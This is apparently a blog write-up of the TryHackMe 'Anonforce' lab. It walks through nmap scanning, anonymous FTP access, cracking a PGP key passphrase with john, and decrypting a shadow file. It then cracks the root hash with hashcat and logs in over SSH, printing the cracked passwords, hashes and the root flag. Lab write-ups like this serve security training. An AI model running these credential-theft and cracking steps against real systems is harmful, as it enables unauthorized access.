---
title: "Tryhackme - Anonforce WriteUp"
date: 2020-10-21
tags: [tryhackme, walkthrough, linux]
header:
  image: "/images/not-found.gif"
excerpt: "Walkthroughs"
---

# TryHackMe - Anonforce WriteUp

## Information Gathering

### nmap

```
root@kali:~/TryHackMe# nmap -sV 10.10.51.139
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
```


### ftp

```
root@kali:~/TryHackMe# ftp 10.10.51.139
Name (10.10.51.139:root): anonymous
Password: password
ftp> dir
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 Oct 20 08:56 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x  100 0        0               0 Oct 20 08:56 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             540 Oct 20 08:56 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 Oct 20 08:56 sys
drwxrwxrwt    9 0        0            4096 Oct 20 08:56 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
ftp> cd /home/
ftp> ls
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
ftp> cd melodias
ftp> ls
-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
ftp> get user.txt
ftp> cd notread
ftp> dir
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
ftp> get backup.pgp
ftp> get private.asc
```

`backup.pgp` - this is an encrypted file which can consist of some passphrase or any essential information
`private.asc` - .asc is an encryption key file which contains the needed password to decrypt the `backup.pgp` file (we need to this file to decrypt \*.pgp file)


### gpg2john [To extract hash form of the passphrase]

```
root@kali:~/TryHackMe# gpg2john private.asc > hash
```

### john [To crack extracted hash from gpg2john]

```
root@kali:~/TryHackMe# john hash --wordlist=/usr/share/wordlists/rockyou.txt
...
xbox360          (anonforce)
```

### gpg [To decrypt `backup.pgp` file]

```
root@kali:~/TryHackMe# gpg --import private.asc 
gpg: /root/.gnupg/trustdb.gpg: trustdb created
gpg: key B92CD1F280AD82C2: public key "anonforce <melodias@anonforce.nsa>" imported
gpg: key B92CD1F280AD82C2: secret key imported
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
root@kali:~/TryHackMe# gpg --decrypt backup.pgp 
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::
```


### hashcat

```

root@kali:~/TryHackMe# hashcat -m 1800 pass --force --wordlist /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:hikari
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycI...b5RVM0
Time.Started.....: Tue Oct 20 20:34:22 2020, (18 secs)
Time.Estimated...: Tue Oct 20 20:34:40 2020, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      377 H/s (8.23ms) @ Accel:32 Loops:128 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 6784/14344385 (0.05%)
Rejected.........: 0/6784 (0.00%)
Restore.Point....: 6656/14344385 (0.05%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidates.#1....: 98765432 -> random1

Started: Tue Oct 20 20:34:04 2020
Stopped: Tue Oct 20 20:34:42 2020
root@kali:~/TryHackMe# 

```

## Exploit && Privilege Escalation

```
root@kali:~/TryHackMe# ssh root@10.10.51.139
root@10.10.51.139's password: hikari 
root@ubuntu:~# cd /root/
root@ubuntu:~# ls
root.txt
root@ubuntu:~# cat root.txt 
f706456440c7af4187810c31c6cebdce
```